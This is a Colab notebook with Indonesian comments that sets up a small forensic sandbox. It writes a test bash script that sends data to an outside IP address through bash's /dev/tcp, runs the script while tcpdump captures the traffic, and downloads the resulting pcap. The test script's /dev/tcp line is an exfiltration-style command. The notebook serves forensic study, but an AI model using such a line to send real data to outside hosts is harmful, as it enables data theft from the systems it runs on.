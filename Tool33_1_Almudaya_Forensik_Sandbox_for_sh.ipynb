{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyN6pYae6DbxKlwW1s9Pe514",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/elangbijak4/Security_Research/blob/main/Tool33_1_Almudaya_Forensik_Sandbox_for_sh.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "id": "nGQm-xQXsbyB"
      },
      "outputs": [],
      "source": [
        "import os\n",
        "\n",
        "# Buat direktori sandbox\n",
        "sandbox_dir = \"sandbox\"\n",
        "os.makedirs(sandbox_dir, exist_ok=True)"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Buat file skrip shell di dalam sandbox\n",
        "script = \"\"\"\n",
        "#!/bin/bash\n",
        "# Mengirim data ke alamat IP tertentu\n",
        "echo \"Test data\" > /dev/tcp/93.184.216.34/80\n",
        "\"\"\"\n",
        "\n",
        "# Tulis ke file script.sh di dalam sandbox\n",
        "script_path = os.path.join(sandbox_dir, \"script.sh\")\n",
        "with open(script_path, \"w\") as file:\n",
        "    file.write(script)\n",
        "\n",
        "# Berikan izin eksekusi\n",
        "os.chmod(script_path, 0o755)"
      ],
      "metadata": {
        "id": "N630bGF-sl0C"
      },
      "execution_count": 7,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Instal tcpdump jika belum terpasang\n",
        "!apt-get install -y tcpdump\n",
        "\n",
        "# Menjalankan tcpdump untuk memantau aktivitas jaringan\n",
        "import subprocess\n",
        "\n",
        "tcpdump_process = subprocess.Popen(['tcpdump', '-w', 'network_activity.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n",
        "\n",
        "# Menunggu proses tcpdump selesai\n",
        "#tcpdump_process.wait()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "DGyGvfumuBsD",
        "outputId": "d2fcaa98-ad02-4f0b-ef71-1b1eb3578828"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "The following additional packages will be installed:\n",
            "  libpcap0.8\n",
            "Suggested packages:\n",
            "  apparmor\n",
            "The following NEW packages will be installed:\n",
            "  libpcap0.8 tcpdump\n",
            "0 upgraded, 2 newly installed, 0 to remove and 45 not upgraded.\n",
            "Need to get 647 kB of archives.\n",
            "After this operation, 1,773 kB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 libpcap0.8 amd64 1.10.1-4build1 [145 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 tcpdump amd64 4.99.1-3ubuntu0.2 [501 kB]\n",
            "Fetched 647 kB in 0s (2,559 kB/s)\n",
            "Selecting previously unselected package libpcap0.8:amd64.\n",
            "(Reading database ... 121926 files and directories currently installed.)\n",
            "Preparing to unpack .../libpcap0.8_1.10.1-4build1_amd64.deb ...\n",
            "Unpacking libpcap0.8:amd64 (1.10.1-4build1) ...\n",
            "Selecting previously unselected package tcpdump.\n",
            "Preparing to unpack .../tcpdump_4.99.1-3ubuntu0.2_amd64.deb ...\n",
            "Unpacking tcpdump (4.99.1-3ubuntu0.2) ...\n",
            "Setting up libpcap0.8:amd64 (1.10.1-4build1) ...\n",
            "Setting up tcpdump (4.99.1-3ubuntu0.2) ...\n",
            "Processing triggers for man-db (2.10.2-1) ...\n",
            "Processing triggers for libc-bin (2.35-0ubuntu3.4) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_0.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbb.so.12 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc_proxy.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_5.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc.so.2 is not a symbolic link\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Eksekusi skrip shell di dalam sandbox\n",
        "result = subprocess.run(['bash', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n",
        "print(\"Output:\")\n",
        "print(result.stdout)\n",
        "print(\"Error:\")\n",
        "print(result.stderr)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "LHSgSZN-uKVs",
        "outputId": "34f6491e-c256-4d12-89b2-c0b2e982795b"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Output:\n",
            "\n",
            "Error:\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Hentikan proses tcpdump\n",
        "tcpdump_process.terminate()\n",
        "\n",
        "# Unduh file hasil pemantauan jaringan\n",
        "from google.colab import files\n",
        "\n",
        "files.download('network_activity.pcap')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 17
        },
        "id": "RT-NycJOuM5v",
        "outputId": "801daf7b-725b-484d-951d-b1c896578a79"
      },
      "execution_count": 10,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "\n",
              "    async function download(id, filename, size) {\n",
              "      if (!google.colab.kernel.accessAllowed) {\n",
              "        return;\n",
              "      }\n",
              "      const div = document.createElement('div');\n",
              "      const label = document.createElement('label');\n",
              "      label.textContent = `Downloading \"${filename}\": `;\n",
              "      div.appendChild(label);\n",
              "      const progress = document.createElement('progress');\n",
              "      progress.max = size;\n",
              "      div.appendChild(progress);\n",
              "      document.body.appendChild(div);\n",
              "\n",
              "      const buffers = [];\n",
              "      let downloaded = 0;\n",
              "\n",
              "      const channel = await google.colab.kernel.comms.open(id);\n",
              "      // Send a message to notify the kernel that we're ready.\n",
              "      channel.send({})\n",
              "\n",
              "      for await (const message of channel.messages) {\n",
              "        // Send a message to notify the kernel that we're ready.\n",
              "        channel.send({})\n",
              "        if (message.buffers) {\n",
              "          for (const buffer of message.buffers) {\n",
              "            buffers.push(buffer);\n",
              "            downloaded += buffer.byteLength;\n",
              "            progress.value = downloaded;\n",
              "          }\n",
              "        }\n",
              "      }\n",
              "      const blob = new Blob(buffers, {type: 'application/binary'});\n",
              "      const a = document.createElement('a');\n",
              "      a.href = window.URL.createObjectURL(blob);\n",
              "      a.download = filename;\n",
              "      div.appendChild(a);\n",
              "      a.click();\n",
              "      div.remove();\n",
              "    }\n",
              "  "
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "download(\"download_ceb4437b-ec12-478c-8896-3f8fe556d578\", \"network_activity.pcap\", 53248)"
            ]
          },
          "metadata": {}
        }
      ]
    }
  ]
}